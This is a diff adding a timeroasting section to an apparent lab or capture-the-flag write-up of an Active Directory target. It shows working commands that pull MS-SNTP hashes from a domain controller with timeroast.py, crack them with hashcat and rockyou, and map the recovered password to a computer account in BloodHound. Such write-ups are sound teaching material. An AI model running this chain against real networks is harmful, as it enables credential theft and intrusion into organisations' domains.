@@ -312,7 +312,7 @@ This `rr.parker` user isn't really useful:
 
 ![](https://github.com/user-attachments/assets/413664ef-49fc-49be-a79f-8a7658eca17b)
 
-But the `mm.turner` user comes up in some shortest path searches:
+But the `mm.turner` user comes up in some shortest path searches, keep this in mind for later:
 
 ![](https://github.com/user-attachments/assets/55e61f44-d1c8-49e4-8e21-d3367e2ad312)
 
@@ -320,14 +320,132 @@ But the `mm.turner` user comes up in some shortest path searches:
 
 ![](https://github.com/user-attachments/assets/992d3a1d-bf6b-47ad-a265-588cfdeb700c)
 
+## 3. Timeroasting
+
+A technique called [timeroasting](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac0) may work here
+
+> Unauthenticated clients can take a list of RIDs and send MS-SNTP requests to a DC to collect MD5 digests calculated with domain computer hashes.
+> 
+> This makes timeroasting a viable method to identify and crack pre-created machine accounts and other weak computer passwords in a stealthier manner than by using dictionaries or tools like [pre2k](https://github.com/garrettfoster13/pre2k).
+
+Ther are some requirements for timeroasting to work:
+
+1. The target must be a computer account, and cannot be directly targeted at ordinary user accounts (unless "target Timeroasting" modifies the properties).
+2. The target domain controller starts and responds to the NTP service with Microsoft SNTP Extended Authentication (MS-SNTP), and UDP port 123 is open.
+3. The attacker can send unauthenticated MS-SNTP requests to the DC (no valid credentials are required).
+4. The RID (relative identifier) of computer accounts in the domain can be enumerated.
+5. (Optional) For "target Timeroasting", domain administrator privileges are required to temporarily modify the user account properties so that it is treated as a computer account.
+6. The computer account passwords in the domain are not strongly protected (for example, weak passwords or not changed regularly).
+
+Use the [timeroast.py](https://github.com/SecuraBV/Timeroast) script to dicover hashes:
 
 ```console
+root@kali:~# curl -sLO https://github.com/SecuraBV/Timeroast/raw/refs/heads/main/timeroast.py
 
+root@kali:~# python timeroast.py 10.10.11.75
+1000:$sntp-ms$4b184895bcdac26bd3f6b3a2828053c2$1c0111e900000000000a7e024c4f434cec677c13281ee675e1b8428bffbfcd0aec682232dc582708ec682232dc584a43
+1103:$sntp-ms$68afac2200adfe3932ef2cf535128328$1c0111e900000000000a7e024c4f434cec677c13283f1412e1b8428bffbfcd0aec68223374473471ec68223374474d9c
+1104:$sntp-ms$8a79f64c17489cfdef6abde741677d05$1c0111e900000000000a7e024c4f434cec677c1329a807f1e1b8428bffbfcd0aec68223375b02348ec68223375b044d6
+1105:$sntp-ms$ebfd6adc05f50eb9c4282ecd3b1c4bee$1c0111e900000000000a7e024c4f434cec677c132b01c0cae1b8428bffbfcd0aec6822337709ddcfec6822337709fdaf
+1106:$sntp-ms$52b87937859eaa1487344fdab51f8b9a$1c0111e900000000000a7e024c4f434cec677c13283f1c75e1b8428bffbfcd0aec682233785fce9cec682233785feb22
+1107:$sntp-ms$ea1eab18ecb64061f9a68e02328857dc$1c0111e900000000000a7e024c4f434cec677c1329a88acee1b8428bffbfcd0aec68223379c93cf5ec68223379c95b28
+1118:$sntp-ms$f8c827e647464466b757f683c07bf547$1c0111e900000000000a7e024c4f434cec677c1329e93ef3e1b8428bffbfcd0aec68223389e92fd9ec68223389e94904
+1119:$sntp-ms$e95abb61d469e5b222ba9a0b86c51f0a$1c0111e900000000000a7e024c4f434cec677c132b51f9c7e1b8428bffbfcd0aec6822338b51e5a5ec6822338b5203d8
+1120:$sntp-ms$6b59da9b61a3fb4a00209a5b29a3f403$1c0111e900000000000a7e024c4f434cec677c132898af8ee1b8428bffbfcd0aec6822338cb12b86ec6822338cb1506f
+1121:$sntp-ms$03d52cff33b5b2dadff43f36dce934f0$1c0111e900000000000a7e024c4f434cec677c1329ff822be1b8428bffbfcd0aec6822338e17f91bec6822338e18230c
+1122:$sntp-ms$e61ff6e705a5eeda173c1bcdfa79823a$1c0111e900000000000a7e024c4f434cec677c132b60a633e1b8428bffbfcd0aec6822338f79207dec6822338f794566
+1123:$sntp-ms$92b3593af0f6100870e32c86ebfe63a2$1c0111e900000000000a7e024c4f434cec677c1328a4ac1ce1b8428bffbfcd0aec68223390d5bb88ec68223390d5e071
+1124:$sntp-ms$ad1747f7e239d3b50692b920a23af53c$1c0111e900000000000a7e024c4f434cec677c132a0b8066e1b8428bffbfcd0aec682233923c8e25ec682233923cb161
+1125:$sntp-ms$dd16964e6d6f05fda3e825ebf5d1f424$1c0111e900000000000a7e024c4f434cec677c1327c0d979e1b8428bffbfcd0aec68223393c8f82bec68223393c914b1
+1126:$sntp-ms$b2a364d005ab94fe19a0c309f650ef86$1c0111e900000000000a7e024c4f434cec677c132905c38ee1b8428bffbfcd0aec682233950ddd38ec682233950e0073
+1127:$sntp-ms$51001bfc2f7768ccc4e59c4db49f0830$1c0111e900000000000a7e024c4f434cec677c13291bdcd5e1b8428bffbfcd0aec6822339523f82cec682233952419ba
 ```
+
+Download and unpack the latest version of hashcat:
 
 ```console
+root@kali:~# curl -sLO https://github.com/hashcat/hashcat/releases/download/v7.1.2/hashcat-7.1.2.7z
 
+root@kali:~# 7z x hashcat-7.1.2.7z
+
+7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
+ 64-bit locale=en_SG.UTF-8 Threads:8 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 19682772 bytes (19 MiB)
+
+Extracting archive: hashcat-7.1.2.7z
+--
+Path = hashcat-7.1.2.7z
+Type = 7z
+Physical Size = 19682772
+Headers Size = 25149
+Method = LZMA2:384m LZMA:20 BCJ2
+Solid = +
+Blocks = 2
+
+Everything is Ok
+
+Folders: 56
+Files: 3100
+Size:       389386374
+Compressed: 19682772
+
+root@kali:~# cd hashcat-7.1.2/
+
+root@kali:~/hashcat-7.1.2# ll
+total 4520
+drwxr-xr-x 2 root root    4096 Aug 23 16:51 bridges
+drwxr-xr-x 6 root root    4096 Aug 23 16:51 charsets
+drwxr-xr-x 3 root root    4096 Aug 23 16:51 docs
+-rw-r--r-- 1 root root      72 Aug 23 16:51 example0.cmd
+-rw-r--r-- 1 root root  214302 Aug 23 16:51 example0.hash
+-rwxr-xr-x 1 root root      66 Aug 23 16:51 example0.sh
+-rw-r--r-- 1 root root      63 Aug 23 16:51 example400.cmd
+-rw-r--r-- 1 root root      35 Aug 23 16:51 example400.hash
+-rwxr-xr-x 1 root root      56 Aug 23 16:51 example400.sh
+-rw-r--r-- 1 root root      56 Aug 23 16:51 example500.cmd
+-rw-r--r-- 1 root root      35 Aug 23 16:51 example500.hash
+-rwxr-xr-x 1 root root      50 Aug 23 16:51 example500.sh
+-rw-r--r-- 1 root root 1069601 Aug 23 16:51 example.dict
+drwxr-xr-x 3 root root    4096 Aug 23 16:51 extra
+-rwxr-xr-x 1 root root 1362152 Aug 23 16:51 hashcat.bin
+-rw-r--r-- 1 root root 1537536 Aug 23 16:51 hashcat.exe
+-rw-r--r-- 1 root root  240526 Aug 23 16:51 hashcat.hcstat2
+drwxr-xr-x 2 root root    4096 Aug 23 16:51 layouts
+drwxr-xr-x 2 root root    4096 Aug 23 16:51 masks
+drwxr-xr-x 2 root root   45056 Aug 23 16:51 modules
+drwxr-xr-x 2 root root   69632 Aug 23 16:51 OpenCL
+drwxr-xr-x 2 root root    4096 Aug 23 16:51 Python
+drwxr-xr-x 3 root root    4096 Aug 23 16:51 rules
+drwxr-xr-x 3 root root    4096 Aug 23 16:51 Rust
+drwxr-xr-x 2 root root    4096 Aug 23 16:51 tools
+drwxr-xr-x 2 root root    4096 Aug 23 16:51 tunings
 ```
+
+Put the hashes from `timeroast.py` without the `<rid>:` prefix and run hashcat against the hashes with rockyou.txt
+
+```console
+root@kali:~/hashcat-7.1.2# ./hashcat.bin -m 31300 ../timeroast-hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+⋮
+
+$sntp-ms$dd16964e6d6f05fda3e825ebf5d1f424$1c0111e900000000000a7e024c4f434cec677c1327c0d979e1b8428bffbfcd0aec68223393c8f82bec68223393c914b1:Rusty88!
+Approaching final keyspace - workload adjusted.
+⋮
+```
+
+Match the cracked hash with the original `timeroast.py` output and the RID is `1125`
+
+Search for RID `1125` in BloodHound:
+
+![](https://github.com/user-attachments/assets/82ffc2d9-d1d1-4c67-af5f-b2ce6e9623a8)
+
+And the related computer `IT-COMPUTER3` has `AddSelf` permission to `HELPDESK`:
+
+![](https://github.com/user-attachments/assets/005b6889-3424-4a29-b3b7-a4b0760e21c0)
+
+![](https://github.com/user-attachments/assets/26a6e5e8-b3bd-4dcf-be6f-f9478a2e158a)
 
 ## work-in-progress
 
